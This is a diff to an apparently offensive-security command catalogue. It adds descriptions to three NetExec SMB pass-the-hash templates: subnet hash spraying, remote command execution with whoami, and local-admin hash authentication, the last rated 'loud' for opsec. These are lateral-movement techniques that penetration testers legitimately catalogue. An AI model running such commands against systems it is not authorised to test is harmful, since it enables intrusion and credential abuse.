@@ -65,15 +65,18 @@
   "variations": [
     {
       "label": "Subnet Spray",
-      "command": "netexec smb <cidr> -u <user> -d . -H <nt_hash>"
+      "command": "netexec smb <cidr> -u <user> -d . -H <nt_hash>",
+      "description": "Uses CrackMapExec for network authentication testing and remote operations across multiple protocols and targets."
     },
     {
       "label": "Command Exec",
-      "command": "netexec smb <ip> -u <user> -d . -H <nt_hash> -x whoami"
+      "command": "netexec smb <ip> -u <user> -d . -H <nt_hash> -x whoami",
+      "description": "Uses CrackMapExec to execute a command on the target via SMB (cmd.exe). Remote command execution with the output returned - useful for quick checks across multiple hosts."
     },
     {
       "label": "Local Auth",
-      "command": "netexec smb <cidr> -u <user> -H <nt_hash> --local-auth"
+      "command": "netexec smb <cidr> -u <user> -H <nt_hash> --local-auth",
+      "description": "Authenticates using local (SAM) credentials instead of domain credentials. Tests whether a local admin password or hash works on target machines."
     }
   ],
   "opsec": "loud",
